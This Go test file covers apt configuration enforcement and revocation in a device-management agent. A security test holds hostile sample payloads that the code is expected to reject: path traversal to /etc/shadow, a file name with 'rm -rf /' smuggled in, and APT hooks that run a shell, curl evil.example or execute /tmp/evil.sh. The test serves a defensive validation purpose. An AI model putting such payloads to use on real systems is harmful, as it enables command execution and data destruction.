package engine

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/spire-uem/spire-uem/internal/types"
)

func TestReconcileAptConfig_ValidAndRevoke(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "spire-apt-test-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	origDir := aptConfDir
	aptConfDir = tmpDir
	defer func() { aptConfDir = origDir }()

	ctx := context.Background()

	payloadData := types.AptConfigPayload{
		FileName: "52spire-unattended-upgrades",
		Content:  "// Spire test unattended-upgrades config\nUnattended-Upgrade::Origins-Pattern {\n    \"origin=SpireUEM,label=SpireUEM\";\n};\n",
	}
	payloadBytes, _ := json.Marshal(payloadData)

	policy := types.AssignedPolicy{
		ID:         "pol-apt-upgrades-01",
		Name:       "Test Unattended Upgrades",
		PolicyType: types.PolicyTypeAptConfig,
		Payload:    payloadBytes,
	}

	// 1. Initial Enforcement (drifted = true)
	res1 := ReconcileAptConfig(ctx, policy)
	if res1.ComplianceStatus != types.ComplianceCompliant {
		t.Fatalf("expected COMPLIANT, got %v (err: %s)", res1.ComplianceStatus, res1.ErrorMessage)
	}

	filePath := filepath.Join(tmpDir, "52spire-unattended-upgrades")
	data, err := os.ReadFile(filePath)
	if err != nil {
		t.Fatalf("failed to read expected config file: %v", err)
	}
	if !strings.Contains(string(data), "origin=SpireUEM") {
		t.Errorf("content does not contain expected snippet: %s", string(data))
	}

	// 2. Second Enforcement (idempotent, drifted = false)
	res2 := ReconcileAptConfig(ctx, policy)
	if res2.ComplianceStatus != types.ComplianceCompliant {
		t.Fatalf("expected COMPLIANT on second run, got %v", res2.ComplianceStatus)
	}

	// 3. Removal / Revocation
	if err := RemoveAptConfig(ctx, policy); err != nil {
		t.Fatalf("RemoveAptConfig failed: %v", err)
	}
	if _, err := os.Stat(filePath); !os.IsNotExist(err) {
		t.Errorf("expected file to be removed, but stat returned: %v", err)
	}
}

func TestReconcileAptConfig_SecurityValidation(t *testing.T) {
	ctx := context.Background()

	invalidPayloads := []types.AptConfigPayload{
		{FileName: "", Content: "valid content"},
		{FileName: "../../etc/shadow", Content: "evil"},
		{FileName: "/etc/apt/apt.conf.d/foo", Content: "evil"},
		{FileName: "foo; rm -rf /", Content: "evil"},
		{FileName: "99evil-hook", Content: `APT::Update::Pre-Invoke {"/bin/sh -c id";};`},
		{FileName: "99evil-post", Content: `DPkg::Post-Invoke {"/usr/bin/curl evil.example";};`},
		{FileName: "99evil-proxy", Content: `Acquire::http::Proxy-Auto-Detect "/tmp/evil.sh";`},
	}

	for _, p := range invalidPayloads {
		b, _ := json.Marshal(p)
		res := ReconcileAptConfig(ctx, types.AssignedPolicy{
			ID:         "sec-test",
			PolicyType: types.PolicyTypeAptConfig,
			Payload:    b,
		})
		if res.ComplianceStatus != types.ComplianceFailed {
			t.Errorf("expected FAILED status for invalid fileName %q, got %v", p.FileName, res.ComplianceStatus)
		}
	}
}
